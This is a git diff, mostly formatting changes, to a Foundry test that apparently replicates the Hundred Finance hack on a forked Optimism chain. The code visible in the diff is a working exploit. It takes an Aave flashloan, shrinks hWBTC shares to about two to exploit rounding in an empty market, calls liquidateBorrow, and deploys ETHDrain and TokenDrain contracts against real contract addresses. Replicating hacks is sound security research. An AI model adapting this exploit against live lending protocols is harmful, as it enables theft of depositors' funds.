@@ -3,11 +3,11 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
-import {IERC20} from "../contracts/hack-replication/interfaces/IERC20.sol";
-import {crETH} from "../contracts/hack-replication/interfaces/crETH.sol";
-import {IAaveFlashloan} from "../contracts/hack-replication/interfaces/IAaveFlashloan.sol";
-import {ICErc20Delegate} from "../contracts/hack-replication/interfaces/ICErc20Delegate.sol";
-import {IUnitroller} from "../contracts/hack-replication/interfaces/IUnitroller.sol";
+import { IERC20 } from "../contracts/hack-replication/interfaces/IERC20.sol";
+import { crETH } from "../contracts/hack-replication/interfaces/crETH.sol";
+import { IAaveFlashloan } from "../contracts/hack-replication/interfaces/IAaveFlashloan.sol";
+import { ICErc20Delegate } from "../contracts/hack-replication/interfaces/ICErc20Delegate.sol";
+import { IUnitroller } from "../contracts/hack-replication/interfaces/IUnitroller.sol";
 
 // @Analysis
 // https://twitter.com/peckshield/status/1647307128267476992
@@ -28,7 +28,7 @@ contract HundredFinanceHackReplicator is Test {
     ICErc20Delegate hWBTC = ICErc20Delegate(0x35594E4992DFefcB0C20EC487d7af22a30bDec60);
     crETH CEther = crETH(0x1A61A72F5Cf5e857f15ee502210b81f8B3a66263);
 
-    // TODO: replace all of these addresses with the local, modified ICErc20Delegate contracts
+    // h (c) tokens
     ICErc20Delegate hSNX = ICErc20Delegate(0x371cb7683bA0639A21f31E0B20F705e45bC18896);
     ICErc20Delegate hUSDC = ICErc20Delegate(0x10E08556D6FdD62A9CE5B3a5b07B0d8b0D093164);
     ICErc20Delegate hDAI = ICErc20Delegate(0x0145BE461a112c60c12c34d5Bc538d10670E99Ab);
@@ -41,10 +41,7 @@ contract HundredFinanceHackReplicator is Test {
     address HundredFinanceExploiter = 0x155DA45D374A286d383839b1eF27567A15E67528;
 
     function setUp() public {
-        vm.createSelectFork(
-            "optimism",
-            90_760_765
-        );
+        vm.createSelectFork("optimism", 90_760_765);
         vm.label(address(WBTC), "WBTC");
         vm.label(address(USDC), "USDC");
         vm.label(address(SNX), "SNX");
@@ -61,6 +58,8 @@ contract HundredFinanceHackReplicator is Test {
         vm.label(address(hFRAX), "hFRAX");
         vm.label(address(aaveV3), "aaveV3");
         vm.label(address(unitroller), "unitroller");
+
+        // use "etch" cheatcode to copy the bytecode of our modified cErc20Delegate contract to the hTokens
     }
 
     function testExploit() external {
@@ -90,7 +89,11 @@ contract HundredFinanceHackReplicator is Test {
         uint256 premium,
         address initator,
         bytes calldata params
-    ) external payable returns (bool) {
+    )
+        external
+        payable
+        returns (bool)
+    {
         hWBTC.redeem(hWBTC.balanceOf(address(this)));
 
         console.log("1. ETH Drain \r");
@@ -119,7 +122,7 @@ contract HundredFinanceHackReplicator is Test {
         WBTC.transfer(DrainAddress, WBTC.balanceOf(address(this)));
 
         ETHDrain ETHDrainer = new ETHDrain{salt: bytes32(_salt)}(CEther);
-        CEther.liquidateBorrow{value: 267_919_888_739}(address(ETHDrainer), address(hWBTC));
+        CEther.liquidateBorrow{ value: 267_919_888_739 }(address(ETHDrainer), address(hWBTC));
         hWBTC.redeem(1); // Withdraw remaining share from hWBTC
         console.log("*************************************************");
         console.log("\r");
@@ -155,7 +158,7 @@ contract HundredFinanceHackReplicator is Test {
         return address(uint160(uint256(hash)));
     }
 
-    receive() external payable {}
+    receive() external payable { }
 }
 
 contract ETHDrain is Test {
@@ -169,7 +172,8 @@ contract ETHDrain is Test {
         CEtherDelegate = Delegate;
         WBTC.approve(address(hWBTC), type(uint256).max);
         hWBTC.mint(4 * 1e8);
-        hWBTC.redeem(hWBTC.totalSupply() - 2); // completing the initial deposit, the shares of hWBTC and the amount of WBTC in hWBTC are at a minimum
+        hWBTC.redeem(hWBTC.totalSupply() - 2); // completing the initial deposit, the shares of hWBTC and the amount of
+            // WBTC in hWBTC are at a minimum
         console2.log(
             "ETHDrain's share in hWBTC:",
             hWBTC.balanceOf(address(this)),
@@ -226,7 +230,7 @@ contract ETHDrain is Test {
         console.log("\r");
     }
 
-    receive() external payable {}
+    receive() external payable { }
 }
 
 contract TokenDrain is Test {
@@ -240,7 +244,8 @@ contract TokenDrain is Test {
         CErc20Delegate = Delegate;
         WBTC.approve(address(hWBTC), type(uint256).max);
         hWBTC.mint(4 * 1e8);
-        hWBTC.redeem(hWBTC.totalSupply() - 2); // completing the initial deposit, the shares of hWBTC and the amount of WBTC in hWBTC are at a minimum
+        hWBTC.redeem(hWBTC.totalSupply() - 2); // completing the initial deposit, the shares of hWBTC and the amount of
+            // WBTC in hWBTC are at a minimum
         console2.log(
             "toeknDrain's share in hWBTC:",
             hWBTC.balanceOf(address(this)),
